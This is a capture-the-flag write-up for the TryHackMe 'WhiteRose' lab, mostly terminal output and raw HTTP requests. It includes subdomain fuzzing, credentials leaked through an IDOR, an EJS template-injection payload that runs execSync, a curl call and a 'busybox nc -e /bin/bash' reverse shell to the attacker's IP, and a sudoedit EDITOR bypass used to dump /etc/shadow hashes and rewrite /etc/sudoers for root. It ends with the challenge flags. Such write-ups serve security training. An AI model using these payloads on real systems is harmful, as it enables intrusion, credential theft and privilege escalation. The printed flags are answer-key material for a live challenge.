# TryHackMe - WhiteRose - Easy

## Enumeration

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Subdomain Enumeration

```
┌──(kali㉿kali)-[~/ctf/thm/whiterose]
└─$ ffuf -u <http://cyprusbank.thm> -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -fs 57

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://cyprusbank.thm>
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 57
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 480ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 1575ms]

```

- [http://admin.cyprusbank.thm](http://admin.cyprusbank.thm/)
- Olivia Cortez:olivi8
- http://admin.cyprusbank.thm/messages/?c=5
shows 5 messages

what if c changes to larger number

- http://admin.cyprusbank.thm/messages/?c=10

credential leak

- Gayle Bev : p~]P@5!6;rs558:q


## Exploitation

```
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: <http://admin.cyprusbank.thm>
Connection: keep-alive
Referer: <http://admin.cyprusbank.thm/settings>
Cookie: connect.sid=s%3A2KB-4ArfYQRh0T8KD-H9mRUCUH4K1KhX.dJbBJtHDqyg9ogTO1z%2FPv9VYjhISocAhUC%2B9blE3zlU
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=Tyrell+Wellick

```

output:

```
<body>
<pre>ReferenceError: /home/web/app/views/settings.ejs:14<br> &nbsp; &nbsp;12| &nbsp; &nbsp; &nbsp; &nbsp; &lt;div class=&quot;alert alert-info mb-3&quot;&gt;&lt;%= message %&gt;&lt;/div&gt;<br> &nbsp; &nbsp;13| &nbsp; &nbsp; &nbsp; &lt;% } %&gt;<br> &gt;&gt; 14| &nbsp; &nbsp; &nbsp; &lt;% if (password != -1) { %&gt;<br> &nbsp; &nbsp;15| &nbsp; &nbsp; &nbsp; &nbsp; &lt;div class=&quot;alert alert-success mb-3&quot;&gt;Password updated to &#39;&lt;%= password %&gt;&#39;&lt;/div&gt;<br> &nbsp; &nbsp;16| &nbsp; &nbsp; &nbsp; &lt;% } %&gt;<br> &nbsp; &nbsp;17| &nbsp; &nbsp; &nbsp; &lt;% if (typeof error != &#39;undefined&#39;) { %&gt;<br><br>password is not defined<br> &nbsp; &nbsp;at eval (&quot;/home/web/app/views/settings.ejs&quot;:27:8)<br> &nbsp; &nbsp;at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)<br> &nbsp; &nbsp;at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)<br> &nbsp; &nbsp;at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)<br> &nbsp; &nbsp;at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)<br> &nbsp; &nbsp;at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)<br> &nbsp; &nbsp;at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)<br> &nbsp; &nbsp;at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)<br> &nbsp; &nbsp;at /home/web/app/routes/settings.js:27:7<br> &nbsp; &nbsp;at runMicrotasks (&lt;anonymous&gt;)</pre>
</body>

```

```
 POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
Origin: <http://admin.cyprusbank.thm>
Connection: keep-alive
Referer: <http://admin.cyprusbank.thm/settings>
Cookie: connect.sid=s%3A2KB-4ArfYQRh0T8KD-H9mRUCUH4K1KhX.dJbBJtHDqyg9ogTO1z%2FPv9VYjhISocAhUC%2B9blE3zlU
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=Tyrell+Wellick&password=pass&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('curl 10.4.119.134:8000');

```

output:

```
┌──(kali㉿kali)-[~/ctf/thm/whiterose]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (<http://0.0.0.0:8000/>) ...
10.10.186.73 - - [08/Jan/2025 02:43:49] "GET / HTTP/1.1" 200 -

```

Change the payload to `busybox nc 10.4.119.134 4455 -e /bin/bash`

```
 POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 214
Origin: <http://admin.cyprusbank.thm>
Connection: keep-alive
Referer: <http://admin.cyprusbank.thm/settings>
Cookie: connect.sid=s%3A2KB-4ArfYQRh0T8KD-H9mRUCUH4K1KhX.dJbBJtHDqyg9ogTO1z%2FPv9VYjhISocAhUC%2B9blE3zlU
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=Tyrell+Wellick&password=pass&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('busybox nc 10.4.119.134 4455 -e /bin/bash');

```


```
┌──(kali㉿kali)-[~/ctf/thm/whiterose]
└─$ nc -lnvp 4455
listening on [any] 4455 ...
connect to [10.4.119.134] from (UNKNOWN) [10.10.186.73] 39800
id
uid=1001(web) gid=1001(web) groups=1001(web)

```

**User.txt**

`THM{4lways_upd4te_uR_d3p3nd3nc!3s}`

## Privilege Escalation

```
web@cyprusbank:/tmp$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
web@cyprusbank:/tmp$

```

```
web@cyprusbank:/tmp$ sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
web@cyprusbank:/tmp$

```

```
export EDITOR='vim -- /etc/shadow'
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

```

```
root:$6$LVAc0zJV$81N7Ge4HhMb/U9A/kaL6Px0vay4rEKfNnrZSVbktE2aQxM6Tudl1/ex6tJq6fYFPiOg7WhINFagng4ryejN8e1:19554:0:99999
9:7:::
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
sys:*:18885:0:99999:7:::
sync:*:18885:0:99999:7:::
games:*:18885:0:99999:7:::
man:*:18885:0:99999:7:::
lp:*:18885:0:99999:7:::
mail:*:18885:0:99999:7:::
news:*:18885:0:99999:7:::
uucp:*:18885:0:99999:7:::
proxy:*:18885:0:99999:7:::
www-data:*:18885:0:99999:7:::
backup:*:18885:0:99999:7:::
list:*:18885:0:99999:7:::
irc:*:18885:0:99999:7:::
gnats:*:18885:0:99999:7:::
nobody:*:18885:0:99999:7:::
systemd-network:*:18885:0:99999:7:::
systemd-resolve:*:18885:0:99999:7:::
syslog:*:18885:0:99999:7:::
messagebus:*:18885:0:99999:7:::
_apt:*:18885:0:99999:7:::
lxd:*:18885:0:99999:7:::
uuidd:*:18885:0:99999:7:::
dnsmasq:*:18885:0:99999:7:::
landscape:*:18885:0:99999:7:::
pollinate:*:18885:0:99999:7:::
sshd:*:19550:0:99999:7:::
web:$6$4ZKUpY4r$l6CeLPkyIUHJho0t3dAaxczrZAaKokbPqnM2ndqgfejEz28UlTkzVRMi3zcnwNJ4akVW5qXVm/qxaSSYuzY641:19553:0:999999
:7:::
mongodb:!:19554:0:99999:7:::

```

- export EDITOR='vim -- /etc/sudoers'
add web ALL=(root) NOPASSWD: ALL
- sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

```
web@cyprusbank:~$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (root) NOPASSWD: ALL
web@cyprusbank:~$ sudo bash -p
root@cyprusbank:/home/web#

```

**Root.txt**

`THM{4nd_uR_p4ck4g3s}`

